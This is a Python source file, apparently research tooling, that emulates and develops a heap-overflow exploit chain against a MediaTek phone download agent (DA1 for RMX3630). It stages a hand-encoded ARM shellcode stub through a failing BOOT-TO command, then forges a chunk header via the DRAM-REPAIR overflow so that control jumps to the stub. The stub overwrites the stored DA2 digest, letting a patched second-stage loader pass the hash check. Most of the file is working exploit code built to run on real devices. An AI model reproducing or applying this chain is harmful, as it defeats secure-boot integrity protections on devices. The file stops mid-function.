#!/usr/bin/env python3
"""DA1 (RMX3630 / MT6789) HeapBait -> code-exec chain with **zero heap-address
dependence**.

Why this script exists
----------------------
``docs/notes/da1_fire_chain.py`` proves the chain inside Unicorn, but it has to
*predict* the download buffer ``D`` (first-fit replay of malloc) and put ``D``
in the fake header's size word so that ``free()`` writes ``dpc->cb = D`` and
``cmd_loop``'s ``blx r4`` jumps to the stub sitting in that same download
buffer.  ``D`` is a heap address; on silicon it is unknown, so that chain is
not device-portable.

Key insight implemented here
----------------------------
The real ``CMD:BOOT-TO`` handler (0x201080) downloads the host file to the
**fixed** address 0x40000000 *before* it hashes and compares it::

    0x2011c8  ldr  r0,[fp,#-0x1c]      ; 0x40000000  (jmp_address)
    0x2011dc  mov  r0,r8               ; session
    0x2011e0  mov  r1,r6               ; source_file
    0x2011e4  bl   0x2500d8            ; <-- DOWNLOAD to 0x40000000
    ...
    0x201254  bl   0x2522c4            ; <-- SHA-256 of 0x40000000
    0x20128c  movw r6,#0x88cc          ; <-- compare vs slot 0x2688cc
    0x2012a4  bne  0x201338            ; <-- mismatch branch

A *failing* BOOT-TO therefore still leaves arbitrary host bytes at a fixed,
known address.  That lets us stage the stub itself at 0x40000000 and then use
the HeapBait's size word ``0x40000000`` (a constant) instead of ``D``:
``free()`` writes ``dpc->cb = 0x40000000`` and ``cmd_loop``'s ``blx r4`` lands
on our stub at the fixed staging address.

Chain proved by execution here
------------------------------
1. Boot DA1 (heap_init + command registrar, same harness as the fire chain).
2. **Prelude**: drive the real CMD:BOOT-TO handler with a blob whose digest is
   *not* DA1's expected DA2 digest, and prove by reading memory that the blob
   really sits at 0x40000000, and that the handler failed at the hash compare
   (rc 0xC0070004 + mismatch branch) and not at transport (0xC0010001).
3. Re-sweep the declared DRAM-REPAIR length ``L`` on top of that prelude and
   find the Ls where the malloc'd download chunk is an *exact fit* and the
   following chunk is a live victim that ``mxmlDelete`` later frees, so that
   ``free()`` executes the fire write.
4. **Final chain**: BOOT-TO staging -> DRAM-REPAIR with that L and a payload of
   zeros + the 12-byte fake header ``{0xDEADBEEF, 0x2DF79C, 0x40000000}``
   (all constants, stub *not* in the download buffer) -> ``cmd_loop`` blx r4 ->
   stub at 0x40000000: unlink the forged node, copy the 32-byte digest that
   lives in the stub's own blob body to 0x2688CC, clear dpc+0/+4/+8, ``bx lr``.
5. Prove by execution that the DA survives (free-list walk, malloc/free, one
   more command) and that the REAL BOOT-TO then accepts the patched DA2.

Emulation model (deviation, printed at run time)
-----------------------------------------------
DA1's SHA-256 entry 0x2522C4 drives a hardware crypto block (clock gate
0x1000108C, engine 0x10210A08) and the image contains no software SHA-256 K
table, so the native routine cannot execute in Unicorn.  It is modelled with
``hashlib`` (installed hook at 0x2522C4) and **this deviation is labelled in
the output**.  Everything else -- the BOOT-TO download, the compare loop at
0x20128C..0x2012B4, the mismatch/success branches, the allocator, the handler
dispatch and the stub -- runs as native DA1 code.

Usage
-----
    python docs/notes/da1_fixed_stage.py --image docs/notes/rmx3630-da2/da1_allinone.bin
    python docs/notes/da1_fixed_stage.py --json /tmp/stage.json
    python docs/notes/da1_fixed_stage.py --L 0x3c --no-sweep
"""
from __future__ import annotations

import argparse
import hashlib
import json
import os
import struct
import sys

_HERE = os.path.dirname(os.path.abspath(__file__))
if _HERE not in sys.path:
    sys.path.insert(0, _HERE)

from unicorn import UC_HOOK_CODE                                 # noqa: E402
import unicorn.arm_const as ac                                  # noqa: E402

from da1_emu import SESSION, MALLOC, FREE, DPC_STRUCT            # noqa: E402
from da1_heap_sweep import (                                    # noqa: E402
    CMD_XML, XML_ADDR, DEFAULT_PACKET_LEN, DPC_ADDR, FAKE_MAGIC,
    CHUNK_HDR, _align4, _hexint,
)
from da1_fire_chain import (                                    # noqa: E402
    # harness
    boot, install_sha_engine, walk_free_list, u32, hexdump, disasm,
    predict_download_buffer, sha_native_probe,
    # A32 encoders
    a32_movw, a32_movt, a32_ldr_imm, a32_str_imm, a32_mov_imm, A32_BX_LR,
    # protocol hosts + XML
    ChainHost, BootHost, BOOT_XML, BENIGN_XML,
    # DA1 addresses / chain constants
    CMD_LOOP, BLX_SITE, SAFE_CONT, BOOT_TO, BOOT_HASH_OK, BOOT_HASH_BAD,
    DST_ADDR, SHA_ROUTINE, DA2_AT, DA2_BODY,
    PATCH_OFFSET, PATCH_XOR, FREE_CORE_WRITE, DOWNLOAD_MALLOC_LR,
    MALLOC_RET,
)

# ---------------------------------------------------------------------------
# fixed (constant) chain parameters -- NO heap address anywhere
# ---------------------------------------------------------------------------
FS_STAGE = DA2_AT                    # 0x40000000: BOOT-TO staging buffer, fixed
STUB_ENTRY = FS_STAGE                # stub is entered exactly here by blx r4
STUB_LEN = 0x4C                      # 19 A32 instructions, constant
DIGEST_OFF = 0x80                    # digest offset inside the staged blob
DA1_SLOT = DST_ADDR                  # 0x2688CC: DA1's expected-digest slot
DPC_STRUCT_VA = DPC_STRUCT           # 0x2DF7A0: dpc struct (constant, .bss)
FORGED_NODE = DPC_ADDR               # 0x2DF79C: forged free node (constant)
FAKE_HDR = (FAKE_MAGIC, FORGED_NODE, FS_STAGE)   # 0xDEADBEEF, 0x2DF79C, 0x40000000
L_FINAL = 0x3C                       # declared DRAM-REPAIR length (constant)
TRANSPORT_ERR = 0xC0010001           # download/recv failure
HASH_MISMATCH_ERR = 0xC0070004       # BOOT-TO hash-mismatch return code
BOOT_ARG_OK = 0x2DE180               # dpc->arg the BOOT-TO success path installs
SHA_INPUT_REF = 0x201254             # `bl 0x2522c4` inside BOOT-TO
SHA_CMP_BODY = 0x201298              # compare loop body (ldrb r2,[r5,r1])
SHA_CMP_LO, SHA_CMP_HI = 0x20128C, 0x2012B4   # the compare loop region
MISMATCH_LOG_SITE = 0x2013EC         # mismatch path loads "DA Hash mismatch."
SHA_OUT_ADDR = 0x2BE100              # scratch: SHA output buffer (harness)
SHA_OUTLEN_ADDR = 0x2BE200           # scratch: SHA outlen


# ---------------------------------------------------------------------------
# the stub: absolute, position dependent on 0x40000000 (all constants)
# ---------------------------------------------------------------------------
def a32_ldm_ia(rb: int, regs: int) -> int:        # ldmia rb, {regs}
    return 0xE8900000 | (rb << 16) | (regs & 0xFFFF)


def a32_stm_ia_w(rb: int, regs: int) -> int:      # stmia rb!, {regs}
    return 0xE8A00000 | (rb << 16) | (regs & 0xFFFF)


def build_stub() -> tuple[bytes, list[str]]:
    """Stub staged at 0x40000000 and entered by cmd_loop's ``blx r4``.

    Entry contract: r4 = dpc->cb = 0x40000000, r0 = dpc->arg, lr = 0x2040D8.
    Exit: forged node unlinked, 32-byte digest copied from 0x40000080 to
    0x2688CC, dpc+0/+4/+8 cleared, ``bx lr`` back into cmd_loop.
    Clobbers r0-r7/r12 only (same set the fire-chain stub clobbers).
    """
    words = [
        a32_movw(2, FORGED_NODE & 0xFFFF),        # movw r2, #0xf79c
        a32_movt(2, FORGED_NODE >> 16),           # movt r2, #0x002d
        a32_ldr_imm(0, 2, 0),                     # ldr  r0, [r2]      ; prev
        a32_ldr_imm(1, 2, 4),                     # ldr  r1, [r2, #4]  ; next
        a32_str_imm(1, 0, 4),                     # str  r1, [r0, #4]  ; prev->next
        a32_str_imm(0, 1, 0),                     # str  r0, [r1]      ; next->prev
        a32_movw(3, (FS_STAGE + DIGEST_OFF) & 0xFFFF),   # movw r3, #0x0080
        a32_movt(3, (FS_STAGE + DIGEST_OFF) >> 16),      # movt r3, #0x4000
        a32_ldm_ia(3, 0x00FF),                    # ldm  r3, {r0-r7}  (no wb:
                                                  # base in list + W = UNDEF)
        a32_movw(12, DA1_SLOT & 0xFFFF),          # movw ip, #0x88cc
        a32_movt(12, DA1_SLOT >> 16),             # movt ip, #0x0026
        a32_stm_ia_w(12, 0x00FF),                 # stm  ip!, {r0-r7}
        a32_mov_imm(0, 0),                        # mov  r0, #0
        a32_movw(1, DPC_STRUCT_VA & 0xFFFF),      # movw r1, #0xf7a0
        a32_movt(1, DPC_STRUCT_VA >> 16),         # movt r1, #0x002d
        a32_str_imm(0, 1, 0),                     # str  r0, [r1]      ; dpc+0
        a32_str_imm(0, 1, 4),                     # str  r0, [r1, #4]  ; dpc->cb
        a32_str_imm(0, 1, 8),                     # str  r0, [r1, #8]  ; dpc->arg
        A32_BX_LR,                                # bx   lr
    ]
    expect = [0xE30F279C, 0xE340202D, 0xE5920000, 0xE5921004,
              0xE5801004, 0xE5810000, 0xE3003080, 0xE3443000,
              0xE89300FF, 0xE308C8CC, 0xE340C026, 0xE8AC00FF,
              0xE3A00000, 0xE30F17A0, 0xE340102D, 0xE5810000,
              0xE5810004, 0xE5810008, 0xE12FFF1E]
    assert words == expect, [hex(w) for w in words]
    blob = b"".join(struct.pack("<I", w) for w in words)
    assert len(blob) == STUB_LEN, hex(len(blob))
    assert len(blob) <= DIGEST_OFF
    return blob, disasm(blob, STUB_ENTRY)


def make_blob(stub: bytes, digest: bytes) -> bytes:
    """Stub at +0, zero padding, 32-byte digest at +0x80; 160 bytes total."""
    if len(digest) != 32:
        raise ValueError("digest must be 32 bytes")
    blob = bytearray(DIGEST_OFF + 32)
    blob[:len(stub)] = stub
    blob[DIGEST_OFF:DIGEST_OFF + 32] = digest
    return bytes(blob)


def make_payload(L: int, cb_value: int) -> bytes:
    """DRAM-REPAIR overflow payload: zeros + 12-byte fake header at capacity.

    Pure function of constants: no emulator, no malloc result is consulted.
    ``cb_value`` is the constant that ends up in dpc->cb.
    """
    capacity = _align4(L + 0x10) - CHUNK_HDR
    stream_len = max(L + 0x10, capacity + CHUNK_HDR)
    buf = bytearray(stream_len)
    buf[capacity:capacity + CHUNK_HDR] = struct.pack(
        "<III", FAKE_MAGIC, FORGED_NODE, cb_value)
    return bytes(buf)


# ---------------------------------------------------------------------------
# host: DRAM-REPAIR download responder with a *constant* cb value
# ---------------------------------------------------------------------------
class FixedChainHost(ChainHost):
    """ChainHost with the payload taken from constants instead of D."""

    def __init__(self, emu, declared, payload, cb_value,
                 packet_len=DEFAULT_PACKET_LEN):
        super().__init__(emu, declared, overflow=True, packet_len=packet_len)
        self.payload = payload
        self.cb_value = cb_value

    def _payload(self):
        # keep `predicted` for the geometry report only; it never feeds the
        # payload (which is a precomputed constant).
        self.predicted = predict_download_buffer(self.emu.uc, self.declared)
        return self.payload


# ---------------------------------------------------------------------------
# probes
# ---------------------------------------------------------------------------
class BootProbe:
    """Hooks DA1's BOOT-TO hash compare path (used for prelude and final gate)."""

    def __init__(self, emu):
        self.emu = emu
        self.reset()
        emu.uc.hook_add(UC_HOOK_CODE, self._cmp, begin=SHA_CMP_BODY,
                        end=SHA_CMP_BODY)
        emu.uc.hook_add(UC_HOOK_CODE, self._bad, begin=BOOT_HASH_BAD,
                        end=BOOT_HASH_BAD)
        emu.uc.hook_add(UC_HOOK_CODE, self._ok, begin=BOOT_HASH_OK,
                        end=BOOT_HASH_OK)
        emu.uc.hook_add(UC_HOOK_CODE, self._sha, begin=SHA_INPUT_REF,
                        end=SHA_INPUT_REF)
        emu.uc.hook_add(UC_HOOK_CODE, self._badlog, begin=MISMATCH_LOG_SITE,
                        end=MISMATCH_LOG_SITE)
        # the whole compare region the task names: 0x20128c..0x2012b4
        emu.uc.hook_add(UC_HOOK_CODE, self._range, begin=SHA_CMP_LO,
                        end=SHA_CMP_HI)

    def reset(self):
        self.cmp = 0
        self.range_hits = 0
        self.mismatch = False
        self.ok_log = False
        self.mismatch_log = False
        self.sha_calls = []

    def _cmp(self, uc, a, s, u):
        self.cmp += 1

    def _range(self, uc, a, s, u):
        self.range_hits += 1

    def _bad(self, uc, a, s, u):
        self.mismatch = True

    def _ok(self, uc, a, s, u):
        self.ok_log = True

    def _badlog(self, uc, a, s, u):
        # 0x2013ec: the mismatch path loads the "DA Hash mismatch." string
        # before calling the logger -- reached only on a hash mismatch.
        self.mismatch_log = True

    def _sha(self, uc, a, s, u):
        # at 0x201254: r0 = input, r1 = length
        self.sha_calls.append((uc.reg_read(ac.UC_ARM_REG_R0),
                               uc.reg_read(ac.UC_ARM_REG_R1)))

    def as_dict(self):
        return {"cmp_bytes": self.cmp, "cmp_region_hits": self.range_hits,
                "mismatch_branch": self.mismatch,
                "ok_log": self.ok_log, "mismatch_log": self.mismatch_log,
                "sha_calls": [{"in": a, "len": n} for a, n in self.sha_calls]}


def run_boot_to(emu, data: bytes, probe: BootProbe, xml=BOOT_XML):
    """Drive the real CMD:BOOT-TO handler with `data` (fixed dest 0x40000000)."""
    probe.reset()
    host = BootHost(emu, data)
    emu.on_send = host.on_send
    emu.rx.clear()
    emu.tx.clear()
    emu.write_bytes(XML_ADDR, xml)
    emu.write_bytes(DPC_STRUCT, b"\x00" * 12)
    emu.budget["hits"] = 0
    emu.budget["hit"] = False
    rc = emu.call(BOOT_TO, [SESSION, XML_ADDR]) & 0xFFFFFFFF
    return {"rc": rc, "sent": host.sent, "probe": probe.as_dict(),
            "tx": [bytes(t) for t in emu.tx], "budget_hit": emu.budget["hit"]}


# ---------------------------------------------------------------------------
# step 2: staging prelude
# ---------------------------------------------------------------------------
def stage_prelude(emu, blob: bytes, slot_before: bytes,
                  stub_len: int) -> dict:
    probe = BootProbe(emu)
    run = run_boot_to(emu, blob, probe)
    staged = bytes(emu.uc.mem_read(FS_STAGE, len(blob)))
    mism = [i for i in range(len(blob)) if staged[i] != blob[i]]
    sha_blob = hashlib.sha256(blob).digest()
    # the compare loop exits on the first differing byte
    first_diff = next((i for i in range(32) if sha_blob[i] != slot_before[i]),
                      32)
    expected_cmp = 32 if first_diff == 32 else first_diff + 1
    tx_text = b"".join(run["tx"])
    dpc = [u32(emu.uc, DPC_STRUCT + 4 * i) for i in range(3)]
    out = {
        "blob_len": len(blob),
        "blob_layout": {"stub_len": stub_len,
                        "pad": [stub_len, DIGEST_OFF],
                        "digest_at": DIGEST_OFF},
        "sha256_blob": sha_blob.hex(),
        "slot_before": slot_before.hex(),
        "slot_unchanged": bytes(emu.uc.mem_read(DA1_SLOT, 32)) == slot_before,
        "sha_blob_equals_slot": sha_blob == slot_before,
        "expected_cmp_hits": expected_cmp,
        "first_diff_byte": first_diff,
        "rc": run["rc"],
        "rc_is_hash_mismatch": run["rc"] == HASH_MISMATCH_ERR,
        "rc_is_transport": run["rc"] == TRANSPORT_ERR,
        "bytes_sent": run["sent"],
        "staged_equal": not mism,
        "staged_diff_offsets": mism[:16],
        "staged_head_hex": staged[:0x20].hex(),
        "staged_digest_hex": staged[DIGEST_OFF:DIGEST_OFF + 32].hex(),
        "tx_hash_mismatch_log": b"DA Hash mismatch" in tx_text,
        "dpc_after": dpc,
        "dpc_untouched": all(v == 0 for v in dpc),
        "budget_hit": run["budget_hit"],
        "probe": run["probe"],
        "emu": emu,
    }
    out["ok"] = bool(out["staged_equal"] and out["rc_is_hash_mismatch"]
                     and not out["rc_is_transport"]
                     and out["probe"]["cmp_bytes"] == expected_cmp
                     and out["probe"]["mismatch_branch"]
                     and out["probe"]["mismatch_log"]
                     and out["slot_unchanged"] and out["dpc_untouched"]
                     and out["bytes_sent"] == len(blob)
                     and out["probe"]["sha_calls"]
                     and out["probe"]["sha_calls"][0]["in"] == FS_STAGE
                     and out["probe"]["sha_calls"][0]["len"] == len(blob)
                     and not out["sha_blob_equals_slot"])
    return out


# ---------------------------------------------------------------------------
# step 3: post-prelude DRAM-REPAIR geometry sweep
# ---------------------------------------------------------------------------
def geometry_run(image: str, L: int, prelude_blob: bytes | None,
                 execute_stub: bool = False) -> dict:
    """One fresh emulator: [prelude] -> cmd_loop -> DRAM-REPAIR(L) overflow."""
    emu = boot(image, map_da2=True)
    install_sha_engine(emu)
    prc = None
    if prelude_blob is not None:
        slot = bytes(emu.uc.mem_read(DA1_SLOT, 32))
        prc = stage_prelude(emu, prelude_blob, slot,
                            STUB_LEN)["rc"]

    payload = make_payload(L, FS_STAGE)
    needed = _align4(L + 0x10)
    rec = {
        "L": L, "prelude_rc": prc, "payload_len": len(payload),
        "payload_sha": hashlib.sha256(payload).hexdigest(),
        "D": None, "chunk": None, "needed": needed,
        "exact": False, "capacity": None, "next": None, "victim": None,
        "victim_alloc": False, "victim_freed": False, "fire": None,
        "blx_target": None, "rc": None, "budget_hit": False,
        "free_at_malloc": None, "free_after": None, "handler_rc": None,
        "node_at_malloc": None, "split_remainder": None,
    }
    allocs, frees, fires = [], [], []
    gate = {}
    last_free = {"ptr": None, "lr": None}

    def on_malloc_entry(uc, a, s, u):
        gate["req"] = uc.reg_read(ac.UC_ARM_REG_R0)
        gate["lr"] = uc.reg_read(ac.UC_ARM_REG_LR)
        if gate["lr"] == DOWNLOAD_MALLOC_LR:
            rec["free_at_malloc"] = [
                {"addr": n["addr"], "size": n["size"]}
                for n in walk_free_list(uc)["nodes"]]

    def on_malloc_ret(uc, a, s, u):
        if "req" in gate:
            ptr = uc.reg_read(ac.UC_ARM_REG_R0)
            allocs.append({"request": gate.pop("req"),
                           "lr": gate.pop("lr", 0), "ptr": ptr})
            gate.clear()

    def on_free(uc, a, s, u):
        last_free["ptr"] = uc.reg_read(ac.UC_ARM_REG_R0)
        last_free["lr"] = uc.reg_read(ac.UC_ARM_REG_LR)
        frees.append(dict(last_free))

    def on_fire(uc, a, s, u):
        node = uc.reg_read(ac.UC_ARM_REG_R0)
        # the free-core write is executed by the free() that is running now
        rec_fire = {"node": node, "value": uc.reg_read(ac.UC_ARM_REG_R1),
                    "free_ptr": last_free["ptr"], "free_lr": last_free["lr"],
                    "declared_L": L}
        fires.append(rec_fire)

    def on_blx(uc, a, s, u):
        rec["blx_target"] = uc.reg_read(ac.UC_ARM_REG_R4)
        if not execute_stub:                 # sweep mode: pretend the stub
            uc.reg_write(ac.UC_ARM_REG_PC, SAFE_CONT)   # did its job and returned

    emu.uc.hook_add(UC_HOOK_CODE, on_malloc_entry, begin=MALLOC, end=MALLOC)
    emu.uc.hook_add(UC_HOOK_CODE, on_malloc_ret, begin=MALLOC_RET,
                    end=MALLOC_RET)
    emu.uc.hook_add(UC_HOOK_CODE, on_free, begin=FREE, end=FREE)
    emu.uc.hook_add(UC_HOOK_CODE, on_fire, begin=FREE_CORE_WRITE,
                    end=FREE_CORE_WRITE)
    emu.uc.hook_add(UC_HOOK_CODE, on_blx, begin=BLX_SITE, end=BLX_SITE)

    host = FixedChainHost(emu, L, payload, FS_STAGE)
    emu.on_send = host.on_send
    emu.rx.append(b"OK\x00")
    emu.rx.append(CMD_XML)
    emu.write_bytes(DPC_STRUCT, b"\x00" * 12)
    emu.budget["hits"] = 0
    emu.budget["hit"] = False
    rc = emu.call(CMD_LOOP, []) & 0xFFFFFFFF

    dl = [x for x in allocs if x["lr"] == DOWNLOAD_MALLOC_LR and x["ptr"]]
    D = dl[0]["ptr"] if dl else None
    rec.update({"D": D, "rc": rc, "budget_hit": emu.budget["hit"],
                "alloc_ptrs": [x["ptr"] for x in allocs],
                "free_calls": frees[:160]})
    if D is not None:
        # The fire requires the free node to be consumed WHOLE: only then does
        # the fake header written at D+capacity land exactly on the header of
        # the following (live, later-freed) chunk.  Reading [D-4] after the
        # fact only shows the *requested* chunk size, which malloc always
        # rounds to `needed` even after splitting -- so use the free-list
        # snapshot taken at malloc entry.
        snap = rec["free_at_malloc"] or []
        node = next((n for n in snap if n["size"] >= needed
                     and n["addr"] + CHUNK_HDR == D), None)
        node_size = node["size"] if node else None
        rec["node_at_malloc"] = ({"addr": node["addr"], "size": node["size"]}
                                 if node else None)
        rec["chunk"] = node_size
        rec["exact"] = bool(node_size == needed)
        cap = needed - CHUNK_HDR
        rec["capacity"] = cap
        nxt = D + cap
        rec["next"] = nxt
        rec["victim"] = nxt + CHUNK_HDR
        valloc = [x for x in allocs if x["ptr"] == rec["victim"]]
        rec["victim_alloc"] = bool(valloc)
        rec["victim_alloc_info"] = ({"request": valloc[0]["request"],
                                     "lr": valloc[0]["lr"]} if valloc else None)
        # the *firing* free is the free() running when the free-core write hits
        # the forged node; the same address is also freed earlier by the
        # download-request XML tree, which does not fire.
        fires_on_node = [f for f in fires if f["node"] == FORGED_NODE]
        rec["victim_freed"] = any(f["free_ptr"] == rec["victim"]
                                  for f in fires_on_node)
        rec["victim_free_lr"] = next(
            (f["free_lr"] for f in fires_on_node
             if f["free_ptr"] == rec["victim"]), None)
        rec["victim_free_count"] = sum(1 for f in frees
                                       if f["ptr"] == rec["victim"])
        if node_size is not None and node_size != needed:
            rec["split_remainder"] = node["addr"] + needed
    fire = [f for f in fires if f["node"] == FORGED_NODE]
    rec["fire"] = fire[-1] if fire else None
    rec["fire_count"] = len(fire)
    # note: cmd_loop's own epilogue (0x201064) may clear the dpc struct after
    # the command, so report the value the fire write actually produced.
    rec["dpc_cb"] = fire[0]["value"] if fire else u32(emu.uc, DPC_STRUCT + 4)
    rec["free_after"] = [{"addr": n["addr"], "size": n["size"]}
                         for n in walk_free_list(emu.uc)["nodes"]]
    rec["ok"] = bool(rec["exact"] and rec["victim_freed"]
                     and rec["fire"] and rec["fire"]["value"] == FS_STAGE
                     and rec["fire_count"] == 1)
    return rec


def sweep(image: str, lo: int, hi: int, step: int,
          prelude_blob: bytes | None) -> list:
    out = []
    L = lo
    while L <= hi:
        out.append(geometry_run(image, L, prelude_blob))
        L += step
    return out


# ---------------------------------------------------------------------------
# step 4/5: final chain in one emulator
# ---------------------------------------------------------------------------
def run_final_chain(image: str, da2_path: str, L: int, stub: bytes,
                    blob: bytes, verbose: bool = False) -> dict:
    out = {"image": os.path.abspath(image),
           "da2_path": os.path.abspath(da2_path),
           "L": L, "stub_bytes": len(stub), "blob_bytes": len(blob)}

    # ---- patched DA2 body + its digest --------------------------------
    da2 = open(da2_path, "rb").read()
    if len(da2) < DA2_BODY:
        raise SystemExit(f"DA2 image too short: {len(da2):#x}")
    body = bytearray(da2[:DA2_BODY])
    old_digest = hashlib.sha256(bytes(body)).digest()
    body[PATCH_OFFSET] ^= PATCH_XOR
    digest = hashlib.sha256(bytes(body)).digest()
    out["da2_patch"] = {"offset": PATCH_OFFSET, "xor": PATCH_XOR,
                        "length": DA2_BODY, "old_digest": old_digest.hex(),
                        "new_digest": digest.hex(),
                        "length_preserved": len(body) == DA2_BODY}

    # the blob is built from constants only: stub + digest at +0x80
    expect_blob = make_blob(stub, digest)
    out["blob_matches_constants"] = expect_blob == blob

    # ---- boot + prelude ------------------------------------------------
    emu = boot(image, map_da2=True, verbose=verbose)
    install_sha_engine(emu)
    slot_before = bytes(emu.uc.mem_read(DA1_SLOT, 32))
    out["slot_before"] = slot_before.hex()
    out["slot_before_is_da2_orig"] = slot_before == old_digest
    pre = stage_prelude(emu, blob, slot_before, len(stub))
    pre.pop("emu", None)
    out["prelude"] = pre
    out["prelude_ok"] = pre["ok"]
    if not pre["ok"]:
        out["fatal"] = "staging prelude failed (see prelude evidence)"
        return out
    out["staged_after_prelude"] = bytes(
        emu.uc.mem_read(FS_STAGE, len(blob))).hex()

    # ---- final DRAM-REPAIR through cmd_loop ---------------------------
    ev = {"blx": None, "safe_cont": 0, "fire": None, "free_writes": [],
          "stub_entry": 0, "stub_exit": 0}
    allocs = []
    free_users = []
    snap_at_dl_malloc = []
    gate = {}

    def on_malloc_entry(uc, a, s, u):
        gate["req"] = uc.reg_read(ac.UC_ARM_REG_R0)
        gate["lr"] = uc.reg_read(ac.UC_ARM_REG_LR)
        if gate["lr"] == DOWNLOAD_MALLOC_LR:
            snap_at_dl_malloc[:] = walk_free_list(uc)["nodes"]

    def on_malloc_ret(uc, a, s, u):
        if "req" in gate:
            allocs.append({"request": gate.pop("req"),
                           "lr": gate.pop("lr", 0),
                           "ptr": uc.reg_read(ac.UC_ARM_REG_R0)})
            gate.clear()

    last_free = {"ptr": None, "lr": None}

    def on_free(uc, a, s, u):
        last_free["ptr"] = uc.reg_read(ac.UC_ARM_REG_R0)
        last_free["lr"] = uc.reg_read(ac.UC_ARM_REG_LR)
        free_users.append(dict(last_free))

    def on_blx(uc, a, s, u):
        ev["blx"] = {"target": uc.reg_read(ac.UC_ARM_REG_R4),
                     "r0": uc.reg_read(ac.UC_ARM_REG_R0),
                     "r1": uc.reg_read(ac.UC_ARM_REG_R1),
                     "r2": uc.reg_read(ac.UC_ARM_REG_R2),
                     "r3": uc.reg_read(ac.UC_ARM_REG_R3),
                     "sp": uc.reg_read(ac.UC_ARM_REG_SP),
                     "lr": uc.reg_read(ac.UC_ARM_REG_LR)}

    def on_safe(uc, a, s, u):
        ev["safe_cont"] += 1

    def on_fire(uc, a, s, u):
        node = uc.reg_read(ac.UC_ARM_REG_R0)
        rec = {"node": node, "value": uc.reg_read(ac.UC_ARM_REG_R1),
               "node_prev": u32(uc, node), "node_next": u32(uc, node + 4),
               "free_ptr": last_free["ptr"], "free_lr": last_free["lr"]}
        ev["free_writes"].append(rec)
        if node == FORGED_NODE:
            ev.setdefault("fires", []).append(rec)
            ev["fire"] = rec

    def on_stub_entry(uc, a, s, u):
        ev["stub_entry"] += 1
        ev["stub_lr"] = uc.reg_read(ac.UC_ARM_REG_LR)
        ev["stub_r4"] = uc.reg_read(ac.UC_ARM_REG_R4)
        ev["forged_links"] = (u32(uc, FORGED_NODE), u32(uc, FORGED_NODE + 4))

    def on_stub_exit(uc, a, s, u):
        ev["stub_exit"] += 1

    emu.uc.hook_add(UC_HOOK_CODE, on_malloc_entry, begin=MALLOC, end=MALLOC)
    emu.uc.hook_add(UC_HOOK_CODE, on_malloc_ret, begin=MALLOC_RET,
                    end=MALLOC_RET)
    emu.uc.hook_add(UC_HOOK_CODE, on_free, begin=FREE, end=FREE)
    emu.uc.hook_add(UC_HOOK_CODE, on_blx, begin=BLX_SITE, end=BLX_SITE)
    emu.uc.hook_add(UC_HOOK_CODE, on_safe, begin=SAFE_CONT, end=SAFE_CONT)
    emu.uc.hook_add(UC_HOOK_CODE, on_fire, begin=FREE_CORE_WRITE,
                    end=FREE_CORE_WRITE)
    emu.uc.hook_add(UC_HOOK_CODE, on_stub_entry, begin=STUB_ENTRY,
                    end=STUB_ENTRY)
    emu.uc.hook_add(UC_HOOK_CODE, on_stub_exit, begin=STUB_ENTRY + 0x48,
                    end=STUB_ENTRY + 0x48)

    payload = make_payload(L, FS_STAGE)
    host = FixedChainHost(emu, L, payload, FS_STAGE)
    emu.on_send = host.on_send
    emu.rx.append(b"OK\x00")
    emu.rx.append(CMD_XML)
    emu.write_bytes(DPC_STRUCT, b"\x00" * 12)
    emu.budget["hits"] = 0
    emu.budget["hit"] = False
    rc = emu.call(CMD_LOOP, []) & 0xFFFFFFFF

    out["events"] = ev
    out["payload"] = {"len": len(payload), "hex": payload.hex()}
    out["payload_sent_by_host"] = host.payload == payload
    out["payload_sha"] = hashlib.sha256(payload).hexdigest()
    # the stub must NOT be in the download buffer: its user area is all zeros
    # and the only non-zero bytes are the 12-byte fake header at +capacity.
    _cap = _align4(L + 0x10) - CHUNK_HDR
    out["payload_body_is_zeros"] = (
        payload[:_cap] == b"\x00" * _cap
        and payload[_cap + CHUNK_HDR:] ==
        b"\x00" * (len(payload) - _cap - CHUNK_HDR))
    out["stub_in_download_buffer"] = stub in payload
    out["cmdloop_rc"] = rc
    out["budget_hit"] = emu.budget["hit"]
    dl = [x for x in allocs if x["lr"] == DOWNLOAD_MALLOC_LR and x["ptr"]]
    D = dl[0]["ptr"] if dl else None
    out["download_buffer"] = D
    out["predicted_buffer"] = host.predicted["addr"] if host.predicted else None
    needed = _align4(L + 0x10)
    node = next((n for n in snap_at_dl_malloc if n["size"] >= needed
                 and n["addr"] + CHUNK_HDR == D), None)
    out["chunk"] = node["size"] if node else None
    out["capacity"] = needed - CHUNK_HDR
    out["exact_fit"] = bool(node and node["size"] == needed)
    out["node_at_malloc"] = ({k: node[k] for k in ("addr", "size")}
                             if node else None)
    out["next_chunk"] = (D + out["capacity"]) if D else None
    out["victim_user"] = (out["next_chunk"] + CHUNK_HDR
                          if out["next_chunk"] else None)
    valloc = [x for x in allocs if x["ptr"] == out["victim_user"]]
    out["victim_allocated"] = bool(valloc)
    out["victim_alloc_info"] = ({"request": valloc[0]["request"],
                                 "lr": valloc[0]["lr"]} if valloc else None)
    fires_on_node = ev.get("fires", [])
    out["fire_count"] = len(fires_on_node)
    out["victim_freed"] = any(f["free_ptr"] == out["victim_user"]
                              for f in fires_on_node)
    out["victim_free_lr"] = next((f["free_lr"] for f in fires_on_node
                                  if f["free_ptr"] == out["victim_user"]), None)
    out["victim_free_count"] = sum(1 for f in free_users
                                   if f["ptr"] == out["victim_user"])

    blx = ev["blx"]
    out["blx"] = blx
    out["fire_ok"] = bool(ev["fire"] and ev["fire"]["value"] == FS_STAGE
                          and out.get("fire_count") == 1)
    out["blx_ok"] = bool(blx and blx["target"] == STUB_ENTRY)
    out["stub_entered"] = ev["stub_entry"] >= 1
    out["stub_returned"] = ev["stub_exit"] >= 1 and ev["safe_cont"] >= 1
    out["stub_exit_ok"] = bool(ev.get("stub_lr") == SAFE_CONT)

    # ---- (i) free list -------------------------------------------------
    walk_after = walk_free_list(emu.uc)
    out["free_list_after"] = walk_after
    out["assert_freelist"] = bool(walk_after["sentinel_reached"]
                                 and not walk_after["forged_present"]
                                 and not walk_after["zero_link"])

    # ---- (ii) malloc(0x100) + free x3 ----------------------------------
    rounds = []
    for _ in range(3):
        emu.budget["hits"] = 0
        p = emu.call(MALLOC, [0x100, 0]) & 0xFFFFFFFF
        frc = emu.call(FREE, [p]) & 0xFFFFFFFF
        rounds.append({"ptr": p, "free_rc": frc})
    out["alloc_rounds"] = rounds
    out["assert_alloc"] = all(r["ptr"] not in (0, 0xFFFFFFFF)
                              and r["free_rc"] == 0 for r in rounds)

    # ---- (iii) one more benign command ---------------------------------
    emu.on_send = None
    emu.rx.clear()
    emu.tx.clear()
